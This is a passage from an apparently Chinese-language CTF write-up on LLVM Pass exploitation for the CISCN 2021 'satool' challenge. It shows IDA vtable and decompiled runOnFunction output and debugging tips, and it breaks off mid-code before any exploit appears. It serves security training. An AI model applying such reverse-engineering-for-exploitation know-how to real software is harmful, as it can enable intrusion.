class=&#34;comment&#34;&gt;//写Pass所必须的库&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;llvm/IR/Function.h&amp;quot;&lt;/span&gt;&lt;span class=&#34;comment&#34;&gt;//操作函数所必须的库&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;llvm/Support/raw_ostream.h&amp;quot;&lt;/span&gt;&lt;span class=&#34;comment&#34;&gt;//打印输出所必须的库&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;llvm/IR/LegacyPassManager.h&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;llvm/Transforms/IPO/PassManagerBuilder.h&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;程序中我们需要注册一些相关的内容，opt 操作，以及 clang 所需要的对象。&lt;/p&gt;
&lt;h2 id=&#34;ciscn2021-satool&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ciscn2021-satool&#34;&gt;#&lt;/a&gt; ciscn2021 satool&lt;/h2&gt;
&lt;p&gt;一般来说 LLVM PASS pwn 都是对函数进行 PASS 操作，所以我们首先要找到 runOnFunction 函数时如何重写的，一般来说 runOnFunction 都会在函数表最下面。&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;.data.rel.ro:&lt;span class=&#34;number&#34;&gt;0000000000203&lt;/span&gt;D20                 ;org &lt;span class=&#34;number&#34;&gt;203&lt;/span&gt;D20h&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.data.rel.ro:&lt;span class=&#34;number&#34;&gt;0000000000203&lt;/span&gt;D20 ; `vtable &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;&amp;#x27;&lt;/span&gt;`anonymous namespace&lt;span class=&#34;number&#34;&gt;&amp;#x27;&lt;/span&gt;::SAPass&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.data.rel.ro:&lt;span class=&#34;number&#34;&gt;0000000000203&lt;/span&gt;D20 _ZTVN12_GLOBAL__N_16SAPassE dq &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;        ; offset to this&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.data.rel.ro:&lt;span class=&#34;number&#34;&gt;0000000000203&lt;/span&gt;D28                 dq offset _ZTIN12_GLOBAL__N_16SAPassE ; `typeinfo &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;&amp;#x27;&lt;/span&gt;`anonymous namespace&lt;span class=&#34;number&#34;&gt;&amp;#x27;&lt;/span&gt;::SAPass&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.data.rel.ro:&lt;span class=&#34;number&#34;&gt;0000000000203&lt;/span&gt;D30 off_203D30      dq offset _ZN4llvm4PassD2Ev&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.data.rel.ro:&lt;span class=&#34;number&#34;&gt;0000000000203&lt;/span&gt;D30                                         ; DATA XREF: sub_1930+&lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;↑o&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.data.rel.ro:&lt;span class=&#34;number&#34;&gt;0000000000203&lt;/span&gt;D30                                         ; llvm::Pass::~Pass()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.data.rel.ro:&lt;span class=&#34;number&#34;&gt;0000000000203&lt;/span&gt;D38                 dq offset sub_1990&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.data.rel.ro:&lt;span class=&#34;number&#34;&gt;0000000000203&lt;/span&gt;D40                 dq offset _ZNK4llvm4Pass11getPassNameEv ; llvm::Pass::getPassName(&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.data.rel.ro:&lt;span class=&#34;number&#34;&gt;0000000000203&lt;/span&gt;D48                 dq offset _ZN4llvm4Pass16doInitializationERNS_6ModuleE ; llvm::Pass::doInitialization(llvm::Module &amp;amp;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.data.rel.ro:&lt;span class=&#34;number&#34;&gt;0000000000203&lt;/span&gt;D50                 dq offset _ZN4llvm4Pass14doFinalizationERNS_6ModuleE ; llvm::Pass::doFinalization(llvm::Module &amp;amp;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.data.rel.ro:&lt;span class=&#34;number&#34;&gt;0000000000203&lt;/span&gt;D58                 dq offset _ZNK4llvm4Pass5printERNS_11raw_ostreamEPKNS_6ModuleE ; llvm::Pass::print(llvm::raw_ostream &amp;amp;,llvm::Module &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt;*)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.data.rel.ro:&lt;span class=&#34;number&#34;&gt;0000000000203&lt;/span&gt;D60                 dq offset _ZNK4llvm12FunctionPass17createPrinterPassERNS_11raw_ostreamERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE ; llvm::FunctionPass::createPrinterPass(llvm::raw_ostream &amp;amp;,&lt;span class=&#34;built_in&#34;&gt;std&lt;/span&gt;::__cxx11::basic_string&amp;lt;&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;std&lt;/span&gt;::char_traits&amp;lt;&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;&amp;gt;,&lt;span class=&#34;built_in&#34;&gt;std&lt;/span&gt;::allocator&amp;lt;&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;&amp;gt;&amp;gt; &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt;&amp;amp;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.data.rel.ro:&lt;span class=&#34;number&#34;&gt;0000000000203&lt;/span&gt;D68                 dq offset _ZN4llvm12FunctionPass17assignPassManagerERNS_7PMStackENS_15PassManagerTypeE ; llvm::FunctionPass::assignPassManager(llvm::PMStack &amp;amp;,llvm::PassManagerType)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.data.rel.ro:&lt;span class=&#34;number&#34;&gt;0000000000203&lt;/span&gt;D70                 dq offset _ZN4llvm4Pass18preparePassManagerERNS_7PMStackE ; llvm::Pass::preparePassManager(llvm::PMStack &amp;amp;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.data.rel.ro:&lt;span class=&#34;number&#34;&gt;0000000000203&lt;/span&gt;D78                 dq offset _ZNK4llvm12FunctionPass27getPotentialPassManagerTypeEv ; llvm::FunctionPass::getPotentialPassManagerType(&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.data.rel.ro:&lt;span class=&#34;number&#34;&gt;0000000000203&lt;/span&gt;D80                 dq offset _ZNK4llvm4Pass16getAnalysisUsageERNS_13AnalysisUsageE ; llvm::Pass::getAnalysisUsage(llvm::AnalysisUsage &amp;amp;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.data.rel.ro:&lt;span class=&#34;number&#34;&gt;0000000000203&lt;/span&gt;D88                 dq offset _ZN4llvm4Pass13releaseMemoryEv ; llvm::Pass::releaseMemory(&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.data.rel.ro:&lt;span class=&#34;number&#34;&gt;0000000000203&lt;/span&gt;D90                 dq offset _ZN4llvm4Pass26getAdjustedAnalysisPointerEPKv ; llvm::Pass::getAdjustedAnalysisPointer(&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt;*)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.data.rel.ro:&lt;span class=&#34;number&#34;&gt;0000000000203&lt;/span&gt;D98                 dq offset _ZN4llvm4Pass18getAsImmutablePassEv ; llvm::Pass::getAsImmutablePass(&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.data.rel.ro:&lt;span class=&#34;number&#34;&gt;0000000000203&lt;/span&gt;DA0                 dq offset _ZN4llvm4Pass18getAsPMDataManagerEv ; llvm::Pass::getAsPMDataManager(&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.data.rel.ro:&lt;span class=&#34;number&#34;&gt;0000000000203&lt;/span&gt;DA8                 dq offset _ZNK4llvm4Pass14verifyAnalysisEv ; llvm::Pass::verifyAnalysis(&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.data.rel.ro:&lt;span class=&#34;number&#34;&gt;0000000000203&lt;/span&gt;DB0                 dq offset _ZN4llvm4Pass17dumpPassStructureEj ; llvm::Pass::dumpPassStructure(uint)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.data.rel.ro:&lt;span class=&#34;number&#34;&gt;0000000000203&lt;/span&gt;DB8                 dq offset runonfunction		&lt;span class=&#34;comment&#34;&gt;//这里我进行了重命名&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.data.rel.ro:&lt;span class=&#34;number&#34;&gt;0000000000203&lt;/span&gt;DC0 ; public `anonymous namespace&lt;span class=&#34;number&#34;&gt;&amp;#x27;&lt;/span&gt;::SAPass&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.data.rel.ro:&lt;span class=&#34;number&#34;&gt;0000000000203&lt;/span&gt;DC0 ; `typeinfo &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;&amp;#x27;&lt;/span&gt;`anonymous namespace&lt;span class=&#34;number&#34;&gt;&amp;#x27;&lt;/span&gt;::SAPass&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;再程序的开始 start 会有一些函数名注册，一般不需要搭理。我们重点关注的还是程序如何解释运行程序 ——runOnFunction&lt;/p&gt;
&lt;p&gt;函数里面最开始一定是 getname, 这个就是获取函数名称的，没有什么意义。&lt;/p&gt;
&lt;p&gt;如何调试？&lt;/p&gt;
&lt;p&gt;_一般情况下，题目会指定使用的 opt 加载，或者给出，这道题使用的 opt-8，对应的是 llvm-8。要提一句的是，不同的题目需要的 llvm 版本不同，需要切换，ubuntu18 最高支持的是 llvm-10。接着，我们如何确定断点？我们分析的是 pass.so 的文件，所以如果想断点，就是 offset+vmpass.so 的第一个地址。_但是程序并不是一开始就会加载 pass.so，但是地址应该是有相对固定的偏移，距离 libtinfo.so.5.9 偏移是固定的，就是其低 2 字节。解决办法，利用 compare 函数来定位，compare 会先比较 B4ckD0or，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1wYXNzLWtmNWY0c2UyZzU3Z3ozems2ZDN4MWE5ZTJlYmwzYnViYi5zbw==&#34;&gt;这个时候就已经加载了 pass.so&lt;/span&gt;。&lt;/p&gt;
&lt;p&gt;回到题目，llvmpass pwn 的一个非常重要的电视，因为属于软件思想模拟一个 cpu 架构，所以每次对于我们提供的代码的操作都是种循环。而且因为是 c++ 编写的 so 库，往往会有很多不重要的检查，这些往往是很好辨认的，&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !(&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;)&lt;span class=&#34;built_in&#34;&gt;std&lt;/span&gt;::__cxx11::basic_string&amp;lt;&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;std&lt;/span&gt;::char_traits&amp;lt;&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;&amp;gt;,&lt;span class=&#34;built_in&#34;&gt;std&lt;/span&gt;::allocator&amp;lt;&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;&amp;gt;&amp;gt;::compare(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                              &amp;amp;v89,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                              &lt;span class=&#34;string&#34;&gt;&amp;quot;save&amp;quot;&lt;/span&gt;) )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          v17 = *((_BYTE *)v8 + &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v17 == &lt;span class=&#34;number&#34;&gt;79&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            v18 = &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v17 != &lt;span class=&#34;number&#34;&gt;29&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              llvm::llvm_unreachable_internal(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                (llvm *)&lt;span class=&#34;string&#34;&gt;&amp;quot;Invalid opcode!&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;string&#34;&gt;&amp;quot;/usr/include/llvm/IR/InstrTypes.h&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                (&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)&amp;amp;stru_400.st_value + &lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                v16);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;LABEL_139:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              llvm::llvm_unreachable_internal(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                (llvm *)&lt;span class=&#34;string&#34;&gt;&amp;quot;Invalid opcode!&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;string&#34;&gt;&amp;quot;/usr/include/llvm/IR/InstrTypes.h&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                (&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)&amp;amp;stru_400.st_value + &lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                v36);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;LABEL_140:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              llvm::llvm_unreachable_internal(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                (llvm *)&lt;span class=&#34;string&#34;&gt;&amp;quot;Invalid opcode!&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;string&#34;&gt;&amp;quot;/usr/include/llvm/IR/InstrTypes.h&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                (&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)&amp;amp;stru_400.st_value + &lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                v63);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;LABEL_141:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              llvm::llvm_unreachable_internal(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                